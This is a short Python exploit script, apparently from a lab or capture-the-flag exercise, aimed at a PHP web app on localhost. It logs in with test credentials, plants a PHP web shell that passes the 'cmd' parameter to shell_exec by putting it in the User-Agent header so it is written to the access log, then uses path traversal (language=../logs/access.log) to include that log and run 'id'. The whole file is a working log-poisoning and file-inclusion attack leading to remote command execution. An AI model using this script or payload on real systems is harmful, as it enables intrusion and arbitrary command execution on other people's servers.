import requests

port = "5103"
url = f"http://localhost:{port}"
headers = {"User-Agent": "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>"}

s = requests.Session()

r = s.post(url + "/login.php", {"username": "user1", "password": "user1"})
r = s.post(url + "/index.php?lanugage=en.txt", headers=headers)
r = s.post(url + "/index.php?language=../logs/access.log&cmd=id", headers=headers)
print("-- Result --")
print(r.text)